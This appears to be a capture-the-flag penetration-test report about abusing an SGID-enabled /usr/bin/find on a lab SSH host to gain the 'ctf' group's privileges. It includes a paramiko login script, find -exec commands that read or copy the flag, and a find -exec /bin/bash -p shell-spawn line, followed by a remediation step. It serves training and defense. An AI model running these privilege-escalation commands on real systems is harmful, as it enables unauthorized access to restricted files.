# SUID/SGID Exploitation Report

- **Target:** `cc1.pentestgarage.com:3327`
- **Service:** SSH
- **Status:** COMPLETED - Flag Captured

## 1. Executive Summary
Exploited misconfigured SGID binary (`/usr/bin/find`) to escalate privileges and access files restricted to the `ctf` group.

## 3. Exploitation

### Verify Effective GID During Find Execution

```bash
python3 << 'EOF'
import paramiko
client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
client.connect('cc1.pentestgarage.com', port=3327, username='user', password='user', timeout=10)
stdin, stdout, stderr = client.exec_command('find /home/ctf -exec id \\;')
print(stdout.read().decode())
client.close()
EOF
```

**Output:**
```text
uid=1000(user) gid=1000(user) egid=1001(ctf) groups=1001(ctf),1000(user)
```

```bash

find /home/ctf/flag -exec cat {} \;

# Method 2: Copy to accessible location
find /home/ctf/flag -exec cp {} /tmp/flag \;

# Method 3: Read with head
find /home/ctf/flag -exec head -1 {} \;

# Method 4: Spawn shell with ctf group (if available)
find / -maxdepth 0 -exec /bin/bash -p \;
```

## 5. Technical Details

- **Vulnerability Type:** SGID (Set Group ID) Binary Misconfiguration
- **Root Cause:** `/usr/bin/find` has SGID bit set for `ctf` group (1001), allowing any user to execute commands with effective GID of `ctf`.
- **CVSS Score:** Medium (5.5) - Local privilege escalation to group access

## 6. Remediation

### Immediate Fix
```bash
chmod g-s /usr/bin/find
```

### Verification
```bash
ls -la /usr/bin/find
# Expected: -rwxr-xr-x 1 root ctf ...
```
